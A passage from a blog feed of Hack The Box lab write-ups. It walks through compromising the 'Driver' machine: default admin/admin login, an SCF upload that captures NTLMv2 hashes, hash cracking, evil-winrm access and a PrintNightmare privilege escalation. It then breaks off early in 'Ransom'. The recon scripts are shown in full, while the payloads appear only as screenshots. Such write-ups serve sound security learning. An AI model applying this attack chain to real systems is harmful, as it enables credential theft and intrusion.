<p>Now we are going to send one icmp trace to see if we get a connection with the target machine, and through the ttl we can know what OS is using the machine, remember that the Windows machine have 128 ttl and the Linux machine have 64 tll. And if you can asking why it’s output me 127 instead of 128? It’s because when we send icmp packets it not send directly with the target machine or server, it will send those packets some intermediate node before sending to the target machine and for this reason the ttl decreases by one digit, this process is also called <strong><em>traceroute</em></strong>. You can try to check it with the flag <strong><em>-R</em></strong> on the ping command.</p>

<p align="center">
<img src="/assets/images/img-driver/captura3.png" />
</p>

<p>Anyway in my machine i have defined a script called <strong><em>wichsystem</em></strong> that specifying the target ip address it Will output us if the machine is Windows or Linux through the ttl.</p>

<p align="center">
<img src="/assets/images/img-driver/captura4.png" />
</p>

<p>wichSystem script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
#coding: utf-8
</span>
<span class="kn">import</span> <span class="nn">re</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span>

<span class="c1"># python3 wichSystem.py 10.10.10.188
</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>

    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 %s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>

    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>

    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">ttl_value</span>

<span class="k">def</span> <span class="nf">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">):</span>

    <span class="n">ttl</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">64</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Linux"</span>
    <span class="k">elif</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">128</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Windows"</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Not Found"</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>

    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

    <span class="n">ttl</span> <span class="o">=</span> <span class="n">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>

    <span class="n">os_name</span> <span class="o">=</span> <span class="n">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s (ttl -&gt; %s): %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>
</code></pre></div></div>

<h2 id="scanning">Scanning</h2>

<p>Now we are going to perform nmap scanning to discover ports and other relevant information to the target machine, for this we are going to use the following parameters or flags:</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td>Means that we want to scan all the ports that exists in tcp and udp which is in total 65,535 ports.</td>
    </tr>
    <tr>
      <td>-sS</td>
      <td>Means that we want tcp syn scan.</td>
    </tr>
    <tr>
      <td>–min-rate 5000</td>
      <td>Means we just want to send packets no slower then 5000 packets per second to discover ports, and with that parameter our scan will be most faster.</td>
    </tr>
    <tr>
      <td>–open</td>
      <td>Means that we want only output the ports with the status open not filtred.</td>
    </tr>
    <tr>
      <td>-vvv</td>
      <td>Means that we want to output more information.</td>
    </tr>
    <tr>
      <td>-n</td>
      <td>Means we don’t want DNS resolution, because sometimes the DNS resolution can take our scan much slower.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>Means that we don’t to ping to discover ports.</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td>Means that we want to save the scan in grapable format to not rescan again, you have more formats to save like nmap, xml, etc.</td>
    </tr>
  </tbody>
</table>

<p>the scan:</p>

<p align="center">
<img src="/assets/images/img-driver/captura5.png" />
</p>

<p>And basically i save the scan in grapable format because i have defined in zshrc a function called <strong><em>extractports</em></strong>, that specifying the file name shows me the ports and the IP address of the target machine in a much more elegant way and copies the ports to the clipboard. And this can be useful if there is a machine that has many ports enabled and we don’t have to write those ports one by one to perform another scan.</p>

<p align="center">
<img src="/assets/images/img-driver/captura6.png" />
</p>

<p>The <strong><em>extractPorts</em></strong> script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts <span class="o">()</span> <span class="o">{</span>
        <span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
        <span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">cat </span>extractPorts.tmp
        <span class="nb">rm </span>extractPorts.tmp
<span class="o">}</span>
</code></pre></div></div>

<h2 id="scanning---ports-recognition">Scanning - Ports Recognition</h2>

<p>Once we have discovered possible ports, we will perform another scan to recognize the version of the services that use each of these ports. In order to do that we going to use the following parameters or flags:</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-sCV</td>
      <td>Means that we want to use some nmap scripts, in this case to discover the version and services that are running each of those ports.</td>
    </tr>
    <tr>
      <td>-p</td>
      <td>To specify the ports.</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td>Save the scan in nmap format.</td>
    </tr>
  </tbody>
</table>

<p>The scan:</p>

<p align="center">
<img src="/assets/images/img-driver/captura10.png" />
</p>

<p>Remember that nmap have bunch of scripts that we can use, nmap scripts end in <strong><em>.nse</em></strong> extension (nmap script engine).</p>

<p align="center">
<img src="/assets/images/img-ransom/locate.png" />
</p>

<p>Remember that nmap scripts have many categories that we can search for.</p>

<p align="center">
<img src="/assets/images/img-ransom/categories.png" />
</p>

<p>Now we can use <strong><em>crackmapexec</em></strong> using the smb protocol to see what specific version of Windows have the target machine. And we can see that is a windows 10 enterprise version.</p>

<p align="center">
<img src="/assets/images/img-driver/captura7.png" />
</p>

<p>Let’s check if we can list the shared resources with <strong><em>smbclient</em></strong> making use of a null session. And we get an access denied, so nothing interesting at the moment.</p>

<p align="center">
<img src="/assets/images/img-driver/captura8.png" />
</p>

<p>We are going the check with another tool if it’s let us to use the null session, and this case nothing.</p>

<p align="center">
<img src="/assets/images/img-driver/captura9.png" />
</p>

<p>Before we see that the target machine has the port 80 enabled, so with “whatweb” command we can use it as a “wappalyzer” to see the versions of the framework, web service and the programming language used by the website. hmm firmware update center inresting…</p>

<p align="center">
<img src="/assets/images/img-driver/captura12.png" />
</p>

<p>So, when we try to access on the website it will ask us for credentials, and I try with some typical default credentials and it’s works. The default credential it was user “admin” and the password “admin”, so in this case the target machine has weak password to access on a private site.</p>

<p align="center">
<img src="/assets/images/img-driver/captura13.png" />
</p>

<p>So we are in on the website and the wappalyzer reports few things, which is the frameworks and libraries that are using on this particular webpage, so anything interesting here to exploit.</p>

<p align="center">
<img src="/assets/images/img-driver/captura14.png" />
</p>

<p>On the “Firmware Update” section we can see that we can upload a file, hmm interesting …</p>

<p align="center">
<img src="/assets/images/img-driver/captura15.png" />
</p>

<p>So with “searchsploit” tool we try to see if that have any exploit or vulnerability the service called “MFP firmware update center” we can’t find anything related to that service.</p>

<p align="center">
<img src="/assets/images/img-driver/captura16.png" />
</p>

<h2 id="exploitation">Exploitation</h2>

<p>Before on the section “firmware upload” on the webpage it’s says that the file we upload it will be reviewed by a somebody and then uploaded to the page. Thinking a bit here we can try to use a malicious scf file. So what we can try is to upload the scf file to indicate that we are uploading a new firmware for the printer, and what we can do is that malicious file will load as an icon and on the victim side if the user only sees the icon of that file we can obtain the ntlmv2 hash of that user. More info about scf files on the following website.</p>

<p align="center">
<img src="/assets/images/img-driver/captura17.png" />
</p>

<p>We are going to use this payload and the idea is that icon of the file it will load to our shared resource at the network that is in our attacker’s machine, in my case the share resource will be called “smbFolder”.</p>

<p align="center">
<img src="/assets/images/img-driver/captura18.png" />
</p>

<p>Now we are going to upload the scf file on the target webpage.</p>

<p align="center">
<img src="/assets/images/img-driver/captura19.png" />
</p>

<p>While we are uploading the file, we are going to create our smb server with <strong><em>impacket</em></strong> in our attacker machine, and we are going to specify a shared resource that is called the same name that we have specify on the scf file that is synchronized in the current working directory at the absolute path, and since the target machine is windows 10 we are going to add support the version 2 of smb.</p>

<p>And once we upload the file if a user on the victim machine sees that file icon it should be uploaded to our malicious smb server and with this we would get the NTLMv2 hash of that user. in this case the user is “tony”.</p>

<p align="center">
<img src="/assets/images/img-driver/captura20.png" />
</p>

<p>Once we obtain the user hash, we are going try to crack it with hashcat or john using the rockyou dictionary, it doesn’t take too long to crack the hash because the user “tony” has a very weak password.</p>

<p align="center">
<img src="/assets/images/img-driver/captura21.png" />
</p>

<p>Now with <strong><em>crackmapexec</em></strong> we are going to check if those crendentials is valid or not, and if it’s output <strong><em>+</em></strong> means that the credential is valid.</p>

<p align="center">
<img src="/assets/images/img-driver/captura22.png" />
</p>

<p>Before we have seen that the <strong><em>winrm</em></strong> service is enable on the target machine which is on the port 5985. So once we have obtained valid credentials what we can do now is use those credentials with crackmapexec specifying the winrm service if the user reports pwned (baiscally means that this user have privileges on that machine), and in this case it does.</p>

<p>Basically, it’s reports <strong><em>pwned</em></strong> because the user is in the group <strong><em>remote management user</em></strong> this group is used to allow users to manage servers through the server manager console, which winrm allows us to do that.</p>

<p align="center">
<img src="/assets/images/img-driver/captura23.png" />
</p>

<p>In the case that it’s says pwned, what we can do is with <strong><em>evil-winrm</em></strong> try to access on the target machine with powershell.</p>

<p align="center">
<img src="/assets/images/img-driver/captura24.png" />
</p>

<p>So if we execute <strong><em>net user</em></strong> command specifying the user tony, we can see that this user is on the group <strong><em>remote management users</em></strong>. So we were right.</p>

<p align="center">
<img src="/assets/images/img-driver/captura25.png" />
</p>

<p>So if we access on the user tony desktop we can visualize the first flag, which is <strong><em>user.txt”</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-driver/captura26.png" />
</p>

<p>So if we try to access the on the administrator user directory we get a permission denied, So now we need to escalate privileges.</p>

<p align="center">
<img src="/assets/images/img-driver/captura27.png" />
</p>

<h2 id="privesc---enum">PrivEsc - Enum</h2>

<p>Let’s check what permissions have the user <strong><em>tony</em></strong>, and anything interesting here.</p>

<p align="center">
<img src="/assets/images/img-driver/captura28.png" />
</p>

<p>Let’s try with <strong><em>/all</em></strong> flag we will see more information about the current user, we don’t see any type of permission that we can exploit or that is in a group that we can take advantage, so anything here at the moment.</p>

<p align="center">
<img src="/assets/images/img-driver/captura29.png" />
</p>

<p>If we execute the command <strong><em>systeminfo</em></strong> we get a permission denied, in this case what we can do is try to output an registry to know the information about the system, to do that use the following command: <strong><em>reg query “hklm\software\microsoft\windowsnt\currentversion” /v ProductName</em></strong> this command it will just output the version of the windows.</p>

<p align="center">
<img src="/assets/images/img-driver/captura30.png" />
</p>

<p>If we don’t see a way to escalate privileges we can use <strong><em>linpeas</em></strong> which automates the process to see potential ways to escalate privileges. Since we are dealing with a windows machine we are going to download the binary <strong><em>.exe</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-driver/captura31.png" />
</p>

<p>Once we have downloaded what we can do is to host the linpeas binary with python and download it to the target machine with the <strong><em>upload</em></strong> command or <strong><em>certutil</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-driver/captura32.png" />
</p>

<p>Linpeas reports several interesting information to us, but we are going to focus on the <strong><em>spoolsv</em></strong> service that is more related to the theme of this machine, basically this service is used for managing the printer queue or print spooler and managing the interaction with the printers. So every time that we want to print something with windows, this service caches the print job in memory so your printer knows what to print.</p>

<p align="center">
<img src="/assets/images/img-driver/captura33.png" />
</p>

<h2 id="privesc">PrivEsc</h2>

<p>Searching a little bit with this particular service i found vulnerabilities related to this service called “Print Nightmare”, This critical vulnerability occurs within the print spooler service. There are two variants of this vulnerability the first one allows remote code execution <strong><em>(CVE-2021-34527)</em></strong> and the second it’s allowed to escalate privileges when we have access on the machine <strong><em>(CVE-2021-1675)</em></strong>.</p>

<p>So, in this case we are going to use the <strong><em>CVE-2021-1675</em></strong> for escalate privileges because we have access to the target machine. So, there are two options for using this exploit, in this case we are going to use the first one which is to provide a username and password and then exploit will create a DDL file that creates a local user and adding it to the local administrators group using the credentials the we provide. So, in order to do that I am going to use the following script that is made in PowerShell.</p>

<p align="center">
<img src="/assets/images/img-driver/captura34.png" />
</p>

<p>So once we have downloaded the exploit, we are going to host it with python to transfer that exploit on the target machine. So when we try to execute the exploit it will create a user with admin privilege, but when we try to valid that user in crackmapexec it will report that user isn’t valid and we can’t connect with that user via evil-winrm, so if we will try to import that exploit it gives us permission denied.</p>

<p align="center">
<img src="/assets/images/img-driver/captura35.png" />
</p>

<p>To solve this issue we need to set some execution policies with the following commands annd with that it will allows to import the exploit and let us to create new users with admin privileges. And what this will do is to put the group <strong><em>administrators</em></strong> you can check it using the command ***net user <username>***.</username></p>

<p align="center">
<img src="/assets/images/img-driver/captura36.png" />
</p>

<p>So now with crackmapexec we will try to valid the user that we have ben created, and as you can see it’s output <strong><em>pwned</em></strong> meaning that the user have privileges.</p>

<p align="center">
<img src="/assets/images/img-driver/captura37.png" />
</p>

<p>Now will access to that user with evil-winrm.</p>

<p align="center">
<img src="/assets/images/img-driver/captura38.png" />
</p>

<p>And as you can see, I can access in the admin working directory, and on the desktop folder we can visualize the last flag which is <strong><em>root.txt</em></strong>. And with that we pwned this machine.</p>

<p align="center">
<img src="/assets/images/img-driver/captura39.png" />
</p>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="Pentest" /><category term="Hack the box" /><category term="Windows" /><category term="Web" /><category term="Printer exploitation" /><category term="CVE" /><summary type="html"><![CDATA[Driver is a windows machine with easy level of difficulty both in exploitation phase and privilage escalation this machine is based to attacking printers on a corporate network, we will going to start to create...]]></summary></entry><entry><title type="html">HTB - Ransom</title><link href="http://0.0.0.0:4000/htb-ransom/" rel="alternate" type="text/html" title="HTB - Ransom" /><published>2022-03-18T00:00:00-04:00</published><updated>2022-03-18T00:00:00-04:00</updated><id>http://0.0.0.0:4000/htb-ransom</id><content type="html" xml:base="http://0.0.0.0:4000/htb-ransom/"><![CDATA[<p>Ransom is Linux machine with a medium level defficulty both in exploitain, user own, privilage escalation phase, this involves vulnerabilities such as type juggling that helps u  s gain access to the web page, and we will also have an encrypted zip file that we must access through a plaintext attack and for privilege escalation we must review some code files of the web page that will help us access as the root user.</p>

<p align="center">
<img src="/assets/images/img-ransom/portada.png" />
</p>

<p>Machine matrix</p>

<p align="center">
<img src="/assets/images/img-ransom/matrix.png" />
</p>

<p>Fisrt thing that we are going to do is created a directory with the name of the target machine and inside of that directory with <strong><em>mkt</em></strong> command i am going to create the following directories, to organize the content (mkt is a function that i have defined in my zshrc to create the following directories).</p>

<p align="center">
<img src="/assets/images/img-ransom/captura1.png" />
</p>

<p>Once we have connected to the htb vpn and turned on the target machine, we will check if we have connectivity with the machine by sending one ICMP trace. And we see that we have sent a package and we received it back and with this we already know that we have connectivity, trough the TTL we can know if the machine is windows or linux, remember that the linux machines usually has ttl 64 and the windows machine has ttl 128.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura2.png" />
</p>

<p>And if you asking, why the ttl reports 63 instead of 64? This is because the packet that we send has to go through certain intermediate nodes before reaching the destination and this term is known as traceroute. If we use the <strong><em>-R</em></strong> flag on the ping command we can see those “nodes”.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura3.png" />
</p>

<p>Anyway, i have s script defined on my machine called <strong><em>wichSystem</em></strong>, and simply specifying the IP address of the machine through the ttl will tell us if it is a linux or windows machine.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura4.png" />
</p>

<p>wichSystem script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
#coding: utf-8
</span>
<span class="kn">import</span> <span class="nn">re</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span>

<span class="c1"># python3 wichSystem.py 10.10.10.188
</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>

    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 %s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>

    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>

    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">ttl_value</span>

<span class="k">def</span> <span class="nf">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">):</span>

    <span class="n">ttl</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">64</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Linux"</span>
    <span class="k">elif</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">128</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Windows"</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Not Found"</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>

    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

    <span class="n">ttl</span> <span class="o">=</span> <span class="n">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>

    <span class="n">os_name</span> <span class="o">=</span> <span class="n">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s (ttl -&gt; %s): %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>
</code></pre></div></div>

<h2 id="scanning">Scanning</h2>

<p>We are going to perform nmap scanning to discover ports and other relevant information to the target machine, for this we are going to use the following parameters or flags:</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td>Means that we want to scan all the ports that exists in tcp and udp which is in total 65,535 ports.</td>
    </tr>
    <tr>
      <td>-sS</td>
      <td>Means that we want tcp syn scan.</td>
    </tr>
    <tr>
      <td>–min-rate 5000</td>
      <td>Means we just want to send packets no slower then 5000 packets per second to discover ports, and with that parameter our scan will be most faster.</td>
    </tr>
    <tr>
      <td>–open</td>
      <td>Means that we want only output the ports with the status open not filtred.</td>
    </tr>
    <tr>
      <td>-vvv</td>
      <td>Means that we want to output more information.</td>
    </tr>
    <tr>
      <td>-n</td>
      <td>Means we don’t want DNS resolution, because sometimes the DNS resolution can take our scan much slower.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>Means that we don’t to ping to discover ports.</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td>Means that we want to save the scan in grapable format to not rescan again, you have more formats to save like nmap, xml, etc.</td>
    </tr>
  </tbody>
</table>

<p>The scan:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Thu Mar 17 16:51:23 2022 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allports 10.10.11.153
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.153 ()   Status: Up
Host: 10.10.11.153 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
# Nmap done at Thu Mar 17 16:51:35 2022 -- 1 IP address (1 host up) scanned in 12.01 seconds
</code></pre></div></div>

<p>And basically i save the scan in grapable format because i have defined in zshrc a function called <strong><em>extractports</em></strong>, that specifying the file name shows me the ports and the IP address of the target machine in a much more elegant way and copies the ports to the clipboard. And this can be useful if there is a machine that has many ports enbled and we do not have to write those ports one by one.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura5.png" />
</p>

<p>The <strong><em>extractPorts</em></strong> script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts <span class="o">()</span> <span class="o">{</span>
        <span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
        <span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">cat </span>extractPorts.tmp
        <span class="nb">rm </span>extractPorts.tmp
<span class="o">}</span>
</code></pre></div></div>

<h2 id="scanning---ports-recognition">Scanning - Ports Recognition</h2>

<p>Once we have discovered possible ports, we will perform another scan to recognize the services and versions that use each of these ports. To order to do that we going to use the following parameters or flags:</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-sCV</td>
      <td>Means that we want to use some nmap scripts, in this case to discover the version and services that are running each of those ports.</td>
    </tr>
    <tr>
      <td>-p</td>
      <td>To specify the ports.</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td>Save the scan in nmap format.</td>
    </tr>
  </tbody>
</table>

<p>Remember that nmap have bunch of scripts that we can use, nmap scripts end in <strong><em>.nse</em></strong> extension (nmap script engine).</p>

<p align="center">
<img src="/assets/images/img-ransom/locate.png" />
</p>

<p>Remember that nmap scripts have many categories that we can search for.</p>

<p align="center">
<img src="/assets/images/img-ransom/categories.png" />
</p>

<p>Once the scan is finish we can see the versions of the services, and it output that the target machine is an ubuntu but it does not specify anu version of ubuntu.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura6.png" />
</p>

<p>If we want to know the version of the ubuntu that the target machine is using, what we can do is copy the version that of some services like apache or openssh that is using on the target machine and we can search in launchpad to see what version of ubuntu is used that particular version.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura9.png" />
</p>

<p>And we see that it is a ubuntu focal, this will not help us much to exploit the machine, but it would be good for us, to know what machine we are attacking.</p>

<p align="center">
